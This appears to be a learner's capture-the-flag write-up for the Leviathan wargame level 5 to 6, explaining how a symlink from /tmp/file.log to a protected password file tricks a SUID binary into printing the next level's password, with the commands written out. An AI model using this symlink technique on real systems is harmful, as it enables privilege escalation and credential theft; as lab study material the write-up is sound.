# Leviathan Level 5 → 6

## Objective
Find the password for leviathan6

## Approach
Found `leviathan5` SUID binary that reads `/tmp/file.log`.
Created a symlink from `/tmp/file.log` to `/etc/leviathan_pass/leviathan6`.
Binary followed the symlink and printed the password.

## Commands Used
```bash
ls -la
./leviathan5
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

## What I Learned
- SUID binaries that read files can be exploited via symlinks
- Always check what files a binary reads using ltrace
- Symlink attacks are a classic Linux privilege escalation technique
